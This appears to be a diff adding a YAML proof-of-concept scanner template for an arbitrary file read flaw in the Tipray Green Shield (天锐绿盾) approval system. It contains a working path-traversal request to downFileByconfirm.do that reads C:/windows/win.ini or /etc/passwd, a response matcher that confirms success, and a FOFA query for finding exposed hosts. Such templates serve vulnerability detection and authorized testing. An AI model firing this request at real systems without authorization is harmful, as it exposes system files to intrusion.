@@ -1,0 +1,34 @@
+id: poc-yaml-tipray-gsas-downfilebyconfirm-do-anyfile-read
+info:
+  name: 天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  paths: 'C:/windows/win.ini
+
+    etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /trwfe/service/.%2E/file/downFileByconfirm.do?dstPath={{.paths}}&fileName=&processInstanceIds=
+  expression: '(status_code == 200 && contains(content_type,"application/force-download")
+    && contains(headers,"filename=\"\""))
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"[files]") && contains(body,"bit app support"))
+
+    )
+
+    '
+transport: http
